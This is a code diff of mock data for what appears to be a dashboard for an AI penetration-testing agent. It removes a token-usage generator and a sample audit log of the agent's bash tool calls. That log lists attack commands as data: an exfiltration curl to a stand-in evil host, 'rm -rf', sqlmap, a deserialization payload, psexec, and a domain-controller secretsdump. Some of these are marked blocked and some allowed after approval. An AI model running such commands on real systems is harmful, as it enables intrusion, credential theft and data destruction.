@@ -8,11 +8,9 @@ import type {
   Agent,
   AgentDetail,
   Asset,
-  Audit,
   Company,
   Conversation,
   ConvTokenSummary,
-  DailyTokenBucket,
   Edge,
   Finding,
   FindingAsset,
@@ -1352,9 +1350,6 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
 };
 
 export const intents: TaskNode[] = explorationGraph.nodes.filter((n) => n.type === "intent");
-export const frontier: TaskNode[] = explorationGraph.nodes.filter(
-  (n) => n.type === "intent" && (n.state === "open" || n.state === "running"),
-);
 
 // ── Activity (execution process) ─────────────────────────────────────────────────────
 // Sessions are derived from "intent" by sessions-tab (session.id = intent.id), and the transcript = the activity stream matching the intent_id.
@@ -2963,19 +2958,6 @@ export const tokenSessions: SessionTokenUsage[] = (() => {
 
 export const tokenTotal: TokenTotal = grandTotal;
 
-export const dailyTokens: DailyTokenBucket[] = Array.from({ length: 30 }, (_, i) => {
-  const d = new Date("2026-07-26T00:00:00Z");
-  d.setUTCDate(d.getUTCDate() - (29 - i));
-  const wave = 40000 + Math.round(30000 * Math.abs(Math.sin(i / 3)));
-  return {
-    date: d.toISOString().slice(0, 10),
-    input_tokens: wave,
-    output_tokens: Math.round(wave * 0.08),
-    cache_read_tokens: Math.round(wave * 0.7),
-    cache_write_tokens: Math.round(wave * 0.12),
-  };
-});
-
 export const convTokens: ConvTokenSummary[] = [
   {
     llm_profile_id: 1,
@@ -3062,83 +3044,6 @@ Content-Length: 655
   "phone": "138****6021",
   "items": [{ "sku": "A-100", "qty": 1 }]
 }`,
-};
-
-// ── Security / Audit ─────────────────────────────────────────────────────────
-export const audit: Audit = {
-  attributions: { allow: 312, block: 9 },
-  entries: [
-    {
-      ts: T("2026-07-26T03:33:00Z"),
-      tool: "bash",
-      action: "allow",
-      command: "curl -s -d 'username=admin...' https://admin.acme.com/login",
-    },
-    {
-      ts: T("2026-07-26T03:57:00Z"),
-      tool: "bash",
-      action: "allow",
-      command: "curl -s -b 'session=...' https://admin.acme.com/api/users",
-    },
-    {
-      ts: T("2026-07-26T02:10:00Z"),
-      tool: "bash",
-      action: "block",
-      reason: "Out of target scope: out.evil.example is not in scope",
-      command: "curl https://out.evil.example/exfil",
-    },
-    {
-      ts: T("2026-07-25T22:03:00Z"),
-      tool: "bash",
-      action: "allow",
-      command: "sqlmap -u 'https://www.acme.com/search?q=1' --batch",
-    },
-    {
-      ts: T("2026-07-25T21:00:00Z"),
-      tool: "bash",
-      action: "block",
-      reason: "Destructive command blocked: rm -rf rejected",
-      command: "rm -rf /var/www",
-    },
-    {
-      ts: T("2026-07-25T20:30:00Z"),
-      tool: "bash",
-      action: "allow",
-      command: "git-dumper https://www.acme.com/.git/ /tmp/acme",
-    },
-    {
-      ts: T("2026-07-25T15:20:00Z"),
-      tool: "bash",
-      action: "allow",
-      command:
-        "curl -s -H 'Content-Type: application/json' -d '{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"...}' https://shop.acme.com/api/import",
-    },
-    {
-      ts: T("2026-07-25T21:40:00Z"),
-      tool: "bash",
-      action: "allow",
-      command: "curl -s -d 'script=println+\"whoami\"...' http://10.10.10.20:8080/scriptText",
-    },
-    {
-      ts: T("2026-07-26T00:00:00Z"),
-      tool: "bash",
-      action: "allow",
-      command: "impacket-psexec acme.local/svc_deploy@10.10.10.10",
-    },
-    {
-      ts: T("2026-07-26T00:05:00Z"),
-      tool: "bash",
-      action: "block",
-      reason: "Data exfiltration blocked: secretsdump requires manual approval",
-      command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc",
-    },
-    {
-      ts: T("2026-07-26T00:06:00Z"),
-      tool: "bash",
-      action: "allow",
-      command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc  # allowed after approval",
-    },
-  ],
 };
 
 // ── LLM profiles ─────────────────────────────────────────────────────────────
